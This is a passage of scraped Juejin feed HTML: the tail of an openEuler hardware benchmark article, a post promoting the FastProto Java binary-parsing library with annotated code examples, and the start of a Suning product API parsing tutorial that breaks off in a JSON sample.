<li>单精度浮点性能达 6.02 GFLOPS，双精度达 3.06 GFLOPS，符合 Core i7-11700K
的硬件理论性能（单核心单精度约 0.8 GFLOPS，8 核满负载约 6.4 GFLOPS），性能损耗不足 7%，体现了
openEuler 对 CPU 指令集的深度适配；</li>
<li>双精度计算时间约为单精度的 1.97 倍，符合浮点运算的硬件特性，说明 openEuler 无额外系统层开销，CPU 算力调度高效；</li>
<li>测试过程中通过 nmon 监控发现，CPU 8 核利用率稳定在 95% 以上，无核心闲置或负载不均衡现象，openEuler 的 NUMA调度与多线程优化生效。</li>
</ul>
<p>在 AMD Ryzen 5 5600X 处理器（纯 CPU 节点）上，测试输出如下：</p>
<pre><code class="hljs language-cpp" lang="cpp">单精度浮点矩阵乘法平均时间: <span class="hljs-number">35.216</span> 秒
单精度浮点计算性能: <span class="hljs-number">4.91</span> GF
</code></pre>
<h2 data-id="heading-18">总结</h2>
<ul>
<li>openEuler作为面向数字基础设施的开源操作系统，凭借创新的底层优化与完善生态适配，在中等配置硬件环境中充分展现了多样性算力支持的核心优势 ——默认启用的 NUMA 调度、透明大页等特性让 Intel、AMD 不同架构 CPU 发挥出接近理论峰值的通用算力（单精度最高 6.02GFLOPS），内存带宽与延迟表现优异（19.87 GB/s 传输速率、11.36 纳秒访问延迟）；通过简洁部署流程即可实现 GPU驱动与 CUDA 环境适配，PyTorch 等框架无缝调用 NVIDIA 显卡资源，AI 模型训练 / 推理性能较 CPU场景提升数十倍，混合精度计算加速比达 2.63 倍；同时，系统对分布式算力调度、存储 I/O 性能的优化让多进程训练接近线性加速，NVMeSSD 读写高效稳定，配合低门槛的部署体验与广泛的软硬件兼容，为开发者日常开发、中小企业数据处理、AI应用落地等全场景提供了统一、高效、可靠的算力底座，充分释放不同形态硬件的性能潜力。</li>
</ul>
<blockquote>
<p>如果您正在寻找面向未来的开源操作系统，不妨看看DistroWatch 榜单中快速上升的 openEuler:<a href="https://link.juejin.cn?target=https%3A%2F%2Fdistrowatch.com%2Ftable-mobile.php%3Fdistribution%3Dopeneuler" target="_blank" title="https://distrowatch.com/table-mobile.php?distribution=openeuler" ref="nofollow noopener noreferrer">distrowatch.com/table-mobil…</a>，一个由开放原子开源基金会孵化、支持“超节点”场景的Linux 发行版。
openEuler官网：<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.openeuler.openatom.cn%2Fzh%2F" target="_blank" title="https://www.openeuler.openatom.cn/zh/" ref="nofollow noopener noreferrer">www.openeuler.openatom.cn/zh/</a></p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[别再手写 Java 二进制解析了 — 用 FastProto 从繁琐到优雅]]></title>    <link>https://juejin.cn/post/7579846221168394294</link>    <guid>https://juejin.cn/post/7579846221168394294</guid>    <pubDate>2025-12-05T03:43:20.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579846221168394294" data-draft-id="7579893536105971718" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="别再手写 Java 二进制解析了 — 用 FastProto 从繁琐到优雅"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2025-12-05T03:43:20.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="DengRan"/> <meta itemprop="url" content="https://juejin.cn/user/963603015675320"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            别再手写 Java 二进制解析了 — 用 FastProto 从繁琐到优雅
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/963603015675320/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    DengRan
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-05T03:43:20.000Z" title="Fri Dec 05 2025 03:43:20 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">别再手写 Java 二进制解析了 — 用 FastProto 从繁琐到优雅</h2>
<p><strong>项目地址</strong>：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Findunet%2Ffastproto" target="_blank" title="https://github.com/indunet/fastproto" ref="nofollow noopener noreferrer">GitHub - indunet/fastproto</a></p>
<p>还在用 <code>ByteBuffer</code>、位运算、手动偏移量去解析二进制协议吗？</p>
<p><strong>FastProto 想解决的几个典型痛点：</strong></p>
<ul>
<li>协议一长，满屏都是魔法数字和位运算，<strong>可读性极差</strong>；</li>
<li>协议一改（字段新增/调整），到处找偏移量，<strong>维护成本极高</strong>；</li>
<li>出一个线上问题，要对照抓包逐位排查，<strong>排错效率很低</strong>；</li>
<li>新同事接手，只能从 <code>array[offset + 13]</code> 这种写法里硬抠含义。</li>
</ul>
<p>以一条 20 字节的气象报文为例，对应的协议结构大致如下：</p>





















































































<table><thead><tr><th align="center">字节偏移</th><th align="center">位偏移</th><th align="center">数据类型(C/C++)</th><th align="center">信号名称</th><th align="center">单位</th><th align="center">换算公式</th></tr></thead><tbody><tr><td align="center">0</td><td align="center"/><td align="center">unsigned char</td><td align="center">设备编号</td><td align="center"/><td align="center"/></tr><tr><td align="center">1</td><td align="center"/><td align="center"/><td align="center">预留</td><td align="center"/><td align="center"/></tr><tr><td align="center">2-9</td><td align="center"/><td align="center">long</td><td align="center">时间戳</td><td align="center">ms</td><td align="center"/></tr><tr><td align="center">10-11</td><td align="center"/><td align="center">unsigned short</td><td align="center">湿度</td><td align="center">%RH</td><td align="center"/></tr><tr><td align="center">12-13</td><td align="center"/><td align="center">short</td><td align="center">温度</td><td align="center">℃</td><td align="center"/></tr><tr><td align="center">14-17</td><td align="center"/><td align="center">unsigned int</td><td align="center">气压</td><td align="center">Pa</td><td align="center">p * 0.1</td></tr><tr><td align="center">18</td><td align="center">0</td><td align="center">bool</td><td align="center">设备有效标识</td><td align="center"/><td align="center"/></tr><tr><td align="center">18</td><td align="center">3-7</td><td align="center"/><td align="center">预留</td><td align="center"/><td align="center"/></tr><tr><td align="center">19</td><td align="center"/><td align="center"/><td align="center">预留</td><td align="center"/><td align="center"/></tr></tbody></table>
<p>现实中的协议往往比这张表复杂得多：字段更多、版本更多、变更更频繁。<br/>
<strong>FastProto 的目标，就是让你用 Java 类 + 注解，直接“把这张表写成代码”。</strong></p>
<p>基于这份协议，传统手写解析代码大概是这样：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">byte</span>[] datagram = ...;

<span class="hljs-type">int</span> <span class="hljs-variable">id</span> <span class="hljs-operator">=</span> datagram[<span class="hljs-number">0</span>] &amp; <span class="hljs-number">0xFF</span>;

<span class="hljs-type">long</span> <span class="hljs-variable">timeMillis</span> <span class="hljs-operator">=</span>
        ((<span class="hljs-type">long</span>) datagram[<span class="hljs-number">2</span>] &amp; <span class="hljs-number">0xFF</span>) |
        (((<span class="hljs-type">long</span>) datagram[<span class="hljs-number">3</span>] &amp; <span class="hljs-number">0xFF</span>) &lt;&lt; <span class="hljs-number">8</span>) |
        (((<span class="hljs-type">long</span>) datagram[<span class="hljs-number">4</span>] &amp; <span class="hljs-number">0xFF</span>) &lt;&lt; <span class="hljs-number">16</span>) |
        (((<span class="hljs-type">long</span>) datagram[<span class="hljs-number">5</span>] &amp; <span class="hljs-number">0xFF</span>) &lt;&lt; <span class="hljs-number">24</span>) |
        (((<span class="hljs-type">long</span>) datagram[<span class="hljs-number">6</span>] &amp; <span class="hljs-number">0xFF</span>) &lt;&lt; <span class="hljs-number">32</span>) |
        (((<span class="hljs-type">long</span>) datagram[<span class="hljs-number">7</span>] &amp; <span class="hljs-number">0xFF</span>) &lt;&lt; <span class="hljs-number">40</span>) |
        (((<span class="hljs-type">long</span>) datagram[<span class="hljs-number">8</span>] &amp; <span class="hljs-number">0xFF</span>) &lt;&lt; <span class="hljs-number">48</span>) |
        (((<span class="hljs-type">long</span>) datagram[<span class="hljs-number">9</span>] &amp; <span class="hljs-number">0xFF</span>) &lt;&lt; <span class="hljs-number">56</span>);
<span class="hljs-type">Timestamp</span> <span class="hljs-variable">time</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Timestamp</span>(timeMillis);

<span class="hljs-type">int</span> <span class="hljs-variable">humidity</span> <span class="hljs-operator">=</span> (datagram[<span class="hljs-number">10</span>] &amp; <span class="hljs-number">0xFF</span>) | ((datagram[<span class="hljs-number">11</span>] &amp; <span class="hljs-number">0xFF</span>) &lt;&lt; <span class="hljs-number">8</span>);
<span class="hljs-type">int</span> <span class="hljs-variable">temperature</span> <span class="hljs-operator">=</span> (<span class="hljs-type">short</span>) ((datagram[<span class="hljs-number">12</span>] &amp; <span class="hljs-number">0xFF</span>) | ((datagram[<span class="hljs-number">13</span>] &amp; <span class="hljs-number">0xFF</span>) &lt;&lt; <span class="hljs-number">8</span>));

<span class="hljs-type">boolean</span> <span class="hljs-variable">deviceValid</span> <span class="hljs-operator">=</span> (datagram[<span class="hljs-number">18</span>] &amp; <span class="hljs-number">0x01</span>) != <span class="hljs-number">0</span>;
</code></pre>
<p>字段一多、协议一改，<strong>偏移量、字节序、位运算</strong> 全靠人脑记，既枯燥又容易犯错。</p>
<hr/>
<h3 data-id="heading-1">用 FastProto 写同一份协议，会是什么样？</h3>
<p><strong>FastProto 的核心思想：用注解把“协议结构”直接写在 Java 类上——用一个 POJO 把协议“写成代码”，做到真正的“代码即协议、协议即代码”。</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.indunet.fastproto.annotation.*;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Weather</span> {
    <span class="hljs-meta">@UInt8Type(offset = 0)</span>
    <span class="hljs-type">int</span> id;

    <span class="hljs-meta">@TimeType(offset = 2)</span>
    Timestamp time;

    <span class="hljs-meta">@UInt16Type(offset = 10)</span>
    <span class="hljs-type">int</span> humidity;

    <span class="hljs-meta">@Int16Type(offset = 12)</span>
    <span class="hljs-type">int</span> temperature;

    <span class="hljs-meta">@UInt32Type(offset = 14)</span>
    <span class="hljs-type">long</span> pressure;

    <span class="hljs-meta">@BoolType(byteOffset = 18, bitOffset = 0)</span>
    <span class="hljs-type">boolean</span> deviceValid;
}
</code></pre>
<p>解码和编码只需要两行：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">byte</span>[] datagram = ...;                       <span class="hljs-comment">// 设备发送的二进制报文</span>
<span class="hljs-type">Weather</span> <span class="hljs-variable">weather</span> <span class="hljs-operator">=</span> FastProto.decode(datagram, Weather.class);

<span class="hljs-type">byte</span>[] bytes = FastProto.encode(weather, <span class="hljs-number">20</span>); <span class="hljs-comment">// 重新封装成 20 字节报文</span>
</code></pre>
<p>如果需要做简单换算（比如气压 *0.1），也可以直接写在注解上：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Weather</span> {
    ...

    <span class="hljs-meta">@UInt32Type(offset = 14)</span>
    <span class="hljs-meta">@DecodingFormula(lambda = "x -&gt; x * 0.1")</span>           <span class="hljs-comment">// 解码: uint32 -&gt; double</span>
    <span class="hljs-meta">@EncodingFormula(lambda = "x -&gt; (long) (x * 10)")</span>   <span class="hljs-comment">// 编码: double -&gt; uint32</span>
    <span class="hljs-type">double</span> pressure;
}
</code></pre>
<p>这样，<strong>协议就变成了一个清晰的 Java 类</strong>：<br/>
谁在第几字节、用什么类型、怎么换算，都写在这个 POJO 上，<strong>这份类本身就是最权威的协议文档</strong>，一眼就能看懂，新同事也能快速接手。</p>
<hr/>
<h3 data-id="heading-2">FastProto 帮你省下什么？</h3>
<ul>
<li>
<p><strong>少写重复代码</strong>：<br/>
不再满屏位运算、偏移常量，把注意力放回到“字段定义”和“业务含义”上。</p>
</li>
<li>
<p><strong>协议变更更轻松</strong>：<br/>
字段新增/调整时，只需改类和注解，而不是在一堆 <code>offset += 4;</code> 里埋头搜索。</p>
</li>
<li>
<p><strong>更容易排查问题</strong>：<br/>
二进制抓包一对，看看注解和字段就能快速定位问题，而不是一行一行 print。</p>
</li>
</ul>
<p>FastProto 同时提供<strong>非注解 API</strong>（链式 <code>decode()</code> / <code>create()</code>）、<strong>校验和 / CRC 注解</strong>、<strong>Netty / Kafka 集成</strong>等能力，方便你在不同项目里按需使用。</p>
<hr/>
<h3 data-id="heading-3">想试试？可以从这里开始</h3>
<ul>
<li><strong>引入依赖（Maven）</strong>：</li>
</ul>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.indunet<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>fastproto<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.12.3<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<ul>
<li><strong>更完整的使用说明</strong>：可以查看在线文档站点<br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Findunet.github.io%2Ffastproto%2Fhelp.html" target="_blank" title="https://indunet.github.io/fastproto/help.html" ref="nofollow noopener noreferrer"><code>https://indunet.github.io/fastproto/help.html</code></a> ，<br/>
也可以直接阅读项目里的 <code>README-zh.md</code> 和 <code>docs</code> 目录。</li>
</ul>
<hr/>
<h3 data-id="heading-4">欢迎交流 &amp; 点个 star 支持一下</h3>
<p>FastProto 是一个持续维护的开源项目，很多功能都来自真实业务场景。<br/>
<strong>非常欢迎你：</strong></p>
<ul>
<li>在实际项目中尝试使用，提 Issue 分享使用体验与改进建议；</li>
<li>根据自己的协议场景，提 PR 一起补充文档和示例；</li>
<li>把它推荐给也在为二进制解析头疼的 Java 同学。</li>
</ul>
<p>如果这个项目对你有一点点帮助，<br/>
<strong>也欢迎在 GitHub 上给一个 star，表示支持。</strong><br/>
你的鼓励，会让这个轮子越磨越好。</p>
<p><strong>项目地址</strong>：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Findunet%2Ffastproto" target="_blank" title="https://github.com/indunet/fastproto" ref="nofollow noopener noreferrer">GitHub - indunet/fastproto</a>
项目提供完善的中文 / 英文 README 以及文档站点支持，从快速上手到进阶用法都有覆盖。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[苏宁多规格商品 API 解析实战：SKU 关联逻辑与属性值提取技巧]]></title>    <link>https://juejin.cn/post/7579904059525726234</link>    <guid>https://juejin.cn/post/7579904059525726234</guid>    <pubDate>2025-12-05T03:12:22.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579904059525726234" data-draft-id="7579904059525660698" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="苏宁多规格商品 API 解析实战：SKU 关联逻辑与属性值提取技巧"/> <meta itemprop="keywords" content="API"/> <meta itemprop="datePublished" content="2025-12-05T03:12:22.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="用户18007905473"/> <meta itemprop="url" content="https://juejin.cn/user/3994938590628912"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            苏宁多规格商品 API 解析实战：SKU 关联逻辑与属性值提取技巧
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3994938590628912/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    用户18007905473
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-05T03:12:22.000Z" title="Fri Dec 05 2025 03:12:22 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读14分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">苏宁多规格商品 API 解析实战：SKU 关联逻辑与属性值提取技巧</h2>
<p>苏宁多规格商品（如手机、家电、服饰等）的 API 返回数据中，SKU 与商品主信息的关联逻辑复杂，属性值格式不统一（如分隔符、命名规则差异），是数据解析的核心难点。本文基于苏宁开放平台<code>suning.custom.product.get</code> API 实战，拆解 SKU 与商品主数据的关联逻辑，提供通用的属性值提取、规格维度拆分技巧，并适配不同品类的格式差异，实现多规格商品数据的标准化解析。</p>
<h3 data-id="heading-1">一、核心背景：苏宁多规格商品 API 数据结构</h3>
<p><a href="https://link.juejin.cn?target=o0b.cn%2Fanzexi" target="_blank" title="o0b.cn/anzexi" ref="nofollow noopener noreferrer">苏宁多规格商品的 API </a>响应中，「商品主信息」与「SKU 子信息」是「1:N」的关联关系，核心结构如下：</p>
<p>json</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"code"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"0000"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"msg"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"success"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"body"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"productInfo"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>  <span class="hljs-comment">// 商品主信息（唯一）</span>
      <span class="hljs-attr">"productCode"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"100032189765"</span><span class="hljs-punctuation">,</span>  <span class="hljs-comment">// 商品主ID</span>
      <span class="hljs-attr">"productName"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"小米14 5G手机【多规格】"</span>
